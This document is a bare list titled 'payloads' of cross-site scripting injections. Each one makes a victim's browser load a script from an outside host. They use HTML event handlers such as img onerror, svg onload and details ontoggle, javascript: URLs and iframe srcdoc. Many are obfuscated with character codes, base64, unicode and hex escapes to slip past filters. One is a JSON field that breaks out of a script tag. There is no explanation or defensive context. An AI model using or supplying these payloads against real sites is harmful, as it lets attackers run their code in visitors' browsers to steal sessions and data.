payloads

```jsx
<img src=x onerror='setInterval(function(){var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,117,103,115,101,118,46,111,114,103);document.body.appendChild(s)},5000)' />

<img src=x onerror='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,117,103,115,101,118,46,111,114,103);document.body.appendChild(s)' />

<!-- SVG with onload -->
<svg onload='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,117,103,115,101,118,46,111,114,103);document.body.appendChild(s)'>

<!-- SVG with animate -->
<svg><animate onbegin='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,117,103,115,101,118,46,111,114,103);document.body.appendChild(s)' attributeName=x dur=1s>

<!-- SVG with script tag -->
<svg><script>var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src='https://bugsev.org';document.body.appendChild(s)</script></svg>

<!-- SVG with foreignObject -->
<svg><foreignObject><body onload='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'></foreignObject></svg>

<!-- Video tag -->
<video src=x onerror='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Audio tag -->
<audio src=x onerror='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Body tag -->
<body onload='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Input with autofocus -->
<input autofocus onfocus='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Marquee -->
<marquee onstart='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Details tag -->
<details open ontoggle='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- CSS import with expression (IE) -->
<style>@import'https://bugsev.org/xss.css';</style>

<!-- Link with onload -->
<link rel=stylesheet href=x onerror='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="https://bugsev.org";document.body.appendChild(s)'>

<!-- Meta refresh to JavaScript -->
<meta http-equiv="refresh" content="0;url=javascript:var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src='https://bugsev.org';document.body.appendChild(s)">

<!-- Object data -->
<object data="javascript:var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src='https://bugsev.org';document.body.appendChild(s)">

<!-- Embed -->
<embed src="javascript:var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src='https://bugsev.org';document.body.appendChild(s)">

<!-- Form with name attribute -->
<form name="x"><input id="s" value="https://bugsev.org"></form>
<script>var s=document.createElement('script');s.src=x.s.value;document.body.appendChild(s)</script>

<!-- Iframe srcdoc -->
<iframe srcdoc="<script>var s=document.createElement('script');s.src='https://bugsev.org';parent.document.body.appendChild(s)</script>">

```

```jsx
<!-- Using eval + atob (base64) -->
<img src=x onerror="eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vYnVnc2V2Lm9yZyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKQ=='))">

<!-- Using String.fromCharCode with eval -->
<svg onload="eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,115,58,47,47,98,117,103,115,101,118,46,111,114,103,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41))">

<!-- Using Unicode escape sequences -->
<img src=x onerror="\u0076\u0061\u0072\u0020\u0073\u003d\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0028\u0027\u0073\u0063\u0072\u0069\u0070\u0074\u0027\u0029\u003b\u0073\u002e\u0073\u0072\u0063\u003d\u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u0075\u0067\u0073\u0065\u0076\u002e\u006f\u0072\u0067\u0027\u003b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0062\u006f\u0064\u0079\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0043\u0068\u0069\u006c\u0064\u0028\u0073\u0029">

<!-- Using hex encoding -->
<img src=x onerror="eval('\x76\x61\x72\x20\x73\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3b\x73\x2e\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x75\x67\x73\x65\x76\x2e\x6f\x72\x67\x27\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x62\x6f\x64\x79\x2e\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64\x28\x73\x29')">
```

```jsx
{"name":"test","value":"</script><script src='https://bugsev.org'></script>"}
```
